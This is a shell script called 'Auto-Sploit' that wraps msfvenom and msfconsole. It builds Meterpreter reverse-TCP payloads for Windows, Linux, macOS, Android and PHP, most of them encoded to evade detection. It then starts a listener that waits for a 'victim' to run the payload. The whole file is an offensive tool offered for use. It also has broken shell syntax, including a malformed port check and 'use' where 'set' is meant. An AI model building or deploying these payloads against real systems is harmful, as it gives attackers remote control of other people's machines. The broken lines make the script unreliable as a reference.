#!/bin/sh



echo "

   _         _              __       _       _ _   
  /_\  _   _| |_ ___       / _\_ __ | | ___ (_) |_ 
 //_\\| | | | __/ _ \ _____\ \| '_ \| |/ _ \| | __|
/  _  \ |_| | || (_) |_____|\ \ |_) | | (_) | | |_ 
\_/ \_/\__,_|\__\___/      \__/ .__/|_|\___/|_|\__|
                              |_|                  


BY Suraj Gurav and Chinmay Bhide
For any help or information
contact cbhide81@gmail.com
or suraj2office@gmail.com

Idea and Help Credits
phy507ic.
"

echo "Welcome to metasploit tool enter"
echo "please Enter Your IP"
read IP

echo "\nplease Enter PORT Number"
read PORT

if [$PORT ==null ]
then
  $PORT=4444

fi



while : 
do



#echo "To make exploit  Enter the Detail\n"


echo "enter option \noptions :-  \n 1. Windows \n 2. Linux \n 3. Mac \n 4. Android \n 5. website(php) \n 6. To start session when payload sent to victim \n 7. Exit"


  read INPUT_STRING
  case $INPUT_STRING in
	1)
								
			echo "Enter the name required for exploit file which will have extension .exe "
			read NAME
			msfvenom -a x86 --platform windows  -p  windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f exe > $NAME.exe  #creates payload with exe Extension
			export LHOST			 
			export NAME
			
			
			
			continue
			
			
		;;
	
	2)
		
			echo "Enter the name required for exploit file which will have extension .elf "
			read NAME
			msfvenom  -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp  LHOST=$IP LPORT=$PORT -f elf > $NAME.elf
			export LHOST			 
			export NAME
			continue
		;;
		
	3)
		
			echo "Enter the name required for exploit file which will have extension .bin "
			read NAME
	
			msfvenom  -a x64 --platform osx -p osx/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f macho > $NAME.bin
			export LHOST			 
			export NAME
			


			
			continue
		;;
	4)
		
			echo "Enter the name required for exploit file which will have extension .apk "
			read NAME
	
			msfvenom -a dalvik --platform android -p  android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai R > $NAME.apk
			export LHOST			 
			export NAME
			


			
			continue
		;;
	5)		
			echo "Enter the name required for exploit file which will have extension .php "
			read NAME
			msfvenom -a php --platform PHP -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f raw > $NAME.php
			export LHOST			 
			export NAME
			
		
			continue
		;;

	
	6)
		echo "Creating the session !!"
		msfconsole -x "use exploit/multi/handler;use PAYLOAD ; use LHOST ${IP};use LPORT ${PORT}; exploit -j"   #starts msfconsole and start to listen and also starts meterpreter once target executes payload
		continue
		;;


	7)
		echo "See you again!"
		break
		;;


	
	*)
		echo "Sorry press write the exact option or press exit"
		;;
  esac
done
echo 
echo "That's all folks!"


